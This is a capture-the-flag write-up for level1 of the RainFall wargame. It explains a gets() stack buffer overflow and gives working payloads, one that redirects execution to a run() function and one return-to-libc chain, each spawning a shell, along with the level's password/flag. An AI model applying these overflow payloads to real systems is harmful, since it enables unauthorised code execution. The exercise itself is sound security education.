# Level1

## Analysis

Another executable, [level1](./level1).

When we execute it, it will open a prompt where we can type stuff:

```bash
level1@RainFall:~$ ./level1
asddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
Segmentation fault (core dumped)
level1@RainFall:~$ ./level1

level1@RainFall:~$ ./level1
asdasdalsd
level1@RainFall:~$
```

First thing we notice is that it segfaults when typing too much characters.

Precisely after 76 characters as shown next:

```bash
~/Documents/42/rainfall/level1/resources (main) » python -c 'print "a"*76' | ./level1                                                                                                                                                                                                                                                         ckurt@z1r6p3
[1]    145781 done                              python -c 'print "a"*76' | 
       145782 segmentation fault (core dumped)  ./level1
```

We also decompiled the program [here](./level1_decomp.c) and noticed several things:

- The main is mostly empty

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    void buf;
    return gets(&buf);
}
```
But it returns the result of `gets()`.

- There is also another function outside of the main:

```c
int32_t run()
{
    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
    return system("/bin/sh");
}
```

## Exploit

So if we take a look at an `objdump` of [level1](./level1), we get the output you can find at [level1_dump](./level1_dump).

The part we must take a look at is the address of `run()` which will spawn us a shell.

```
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    
```

Now that we have this wonderful address `08048444`, we will deep into how we can jump there!

Earlier, we used Python to print a precise number of characters, which was the size of the buffer in which the program stores our input. And it's 76 chars long.

Now the other thing which we will have to explain is how the stack is organized:

## Stack explained

When running a program, the system will allocate space for its needs in a specific order:
```
|------|
|kernel|
|------|
|stack |
|------|
|   I  |
|   V  |
|      |
|   ^  |
|   I  |
|------|
| heap |
|------|
| data |
|------|
| text |
|------|
```

- Kernel: it's where the command line parameters are stored
- Stack: holds local variables for each functions, when a new function is called, the arguments are pushed downward
- Heap: where allocated data is stored, huge data such as files etc.
- Data: where uninitialized and inizialized data are stored
- Text: read only area where the actual code is stored

Now, when a function is called, such as `gets()`, arguments are pushed onto the stack but so are the return address (where the pointer should return when the function is done) and the base pointer.

And then there is our buffer, which is pushed at the end.

Now, if we fill our buffer, which is on the stack, to the brim and over, we will overflow on the return address! Why? Because when a function is called, it will push the function itself on the stack, then the parameters, then the return address and finally the base pointer to look something like this:

```
       HIGH
|----------------|   ----- Frame start
|                |
|    ARGUMENTS   |
|                |
|----------------|
|     RET        |
|----------------|
|     EBP        |   --> points to previous / main's frame
|----------------|
|                |
|  LOCAL VAR     |
|     BUFFER     |
|                |   buffer would fill from bottom to up
|----------------|   ---- Frame end (ESP)
       LOW

Previous frames would be here
```

Now that we have this beautiful example, we can see why going higher than the buffer would cause issues...

If we override the return address, the function will end and jump to the end of our payload which replaced the base return address!

If this explication doesn't work for you, here's the [video](https://www.youtube.com/watch?v=1S0aBV-Waeo&ab_channel=Computerphile) that helped me through Dr_quine and this level!

## What's next

Now that we understand how, let's craft our payload!

We can use the same command we used to find our buffer limit earlier, Python our savior today:

`python -c 'print "a"*76' | ./level1`

That will fill the buffer part and the bp part! So the next part will be on the return adress, we can write another address such as another function? And it will return to this function instead of the main, such as `08048444`.

Now we will use python to do so, careful about the endian to write the address!

Which should be:

`\x44\x84\x04\x08`

And the final part of our craft will result in:

<details>
       <summary>Spoiler</summary>

```bash
level1@RainFall:~$ python2 -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$
```

Uh? Weird, it doesn't keep the shell open... Since the `/bin/sh` will read the input passed previously and read EOF which will close the prompt.

More precisions about this specific issue [here](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)

So there is a small trick we can use using `-` which is an alias to `/dev/stdin`. In this case it will be used to concat our payload and stdin so that the shell doesn't close!

```bash
level1@RainFall:~$ python2 -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload.txt
level1@RainFall:~$ cat /tmp/payload.txt - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

</details>

## Alternative exploit | Return to lib-c

We can also use something called "return to lib-c" which will trick our program into returning to a libc function address instead of its usual routine

To do that we will need several elements:

### Locate `system()` address

We need to get the address of `system()` inside our program, which means, hello GDB:

```bash
level1@RainFall:~$ gdb level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level1/level1

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb)
```

We now have our address: `0xb7e6b060`

### Locate the `exit()` address

Same path for this one:

```bash
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

Which gives us the following address: `0xb7e5ebe0`

### Locate `/bin/sh` address

It will be a little different, we will use the address of the libc and try to find the string "/bin/sh" from this address:

```bash
(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb)
```

Which gives us our last address: `0xb7f8cc58`

### The payload

Now, we can craft our payload, which will ressemble something like this:

`[filler] + [system addr] + [exit addr] + [/bin/sh addr]`

And execute it as usual:

<details>
       <summary>Spoiler</summary>

```bash
level1@RainFall:~$ python2 -c 'print "a"*76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/payload.txt
level1@RainFall:~$ cat /tmp/payload.txt - | ./level1
whoami
level2
```

</details>

## Flag

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77